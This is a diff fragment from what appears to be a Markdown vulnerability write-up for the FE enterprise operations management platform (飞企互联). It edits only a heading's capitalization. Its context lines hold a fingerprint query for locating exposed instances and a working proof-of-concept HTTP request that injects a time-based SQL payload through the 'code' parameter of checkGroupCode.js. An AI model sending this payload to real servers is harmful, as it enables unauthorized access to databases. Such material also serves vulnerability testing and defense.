@@ -8,7 +8,7 @@
 app="飞企互联-FE企业运营管理平台"
 ```
 
-## poc
+## POC
 
 ```
 GET /docexchangeManage/checkGroupCode.js%70?code=1%27;waitfor+delay+%270:0:4%27--+ HTTP/1.1
